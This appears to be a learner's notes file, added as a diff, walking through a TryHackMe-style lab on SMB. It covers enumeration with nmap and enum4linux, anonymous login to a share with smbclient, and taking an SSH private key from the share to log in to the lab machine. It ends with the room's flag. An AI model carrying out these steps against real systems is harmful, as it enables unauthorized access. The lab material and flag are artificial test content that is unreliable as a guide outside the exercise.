@@ -1,0 +1,73 @@
+--- network services --
+  ----  SMB (server message block) protocol --
+
+-- Is a client server communication protocol used for sharing access to files,printers,serial ports and other resources on a network 
+--known as a response-request protocol meaning that it transmits multiple messages between the client and server to establish a connection.
+-- clients connect to servers using TCP/IP
+
+
+--ENUMARATING SMB --
+--- Tools used?
+- nmap to scan ports
+- enum4linux to find any useful information about the target in view
+----Find the port
+--3
+--139/445
+----Operating System?
+--Windows 6.1
+----what system samba runs on?
+--unix
+---state the workgroup name.
+--Workgroup
+---The share that sticks out?
+Profiles
+Enum4linux syntax
+enum4linux -[option] [ip_of the target client]
+common usages 
+-U             get userlist
+-M             get machine list
+-N             get namelist dump (different from -U and-M)
+-S             get sharelist
+-P             get password policy information
+-G             get group and member list
+
+-a             all of the above (full basic enumeration)
+
+
+-----EXPLOITING SMB ----
+Here we are explioting a common misconfiguration of the user Anonymous 
+-- Login with the username anonymous
+smbclient //ip/user -U Username - p port(Default ports)
+-- Here for instance we used 
+smbclient //10.10.10.2/secret -U suit -p 445
+smbclient //10.10.69.191/Profiles -U Anonymous -p 445
+this configuration does not ask for a password
+which when logging in does provide access to the machines _sshfile which can be used to escalate the privilage to have a user sign in with the current default password
+
+
+
+--- To download a file on SMB client the following syntax is used
+-- get/mget file_name*
+
+----To read a file in the smb client the syntax below is used
+--more "file_name"
+
+To change the id_rsa file into a usable the format 
+ -- first move it to an .ssh folder/file
+ ---then chmod 600 [id_rsa]
+
+To find the correct username of the account
+more id_rsa.pub and find it at the end of the document
+
+----- To log in into the specific user account 
+--syntax
+ssh -i id_rsa username@ip
+in this case we used 
+ssh -i id_rsa cactus@10.10.69.191
+ls
+smb.txt contained the flag
+THM{smb_is_fun_eh?}
+
+
+
+
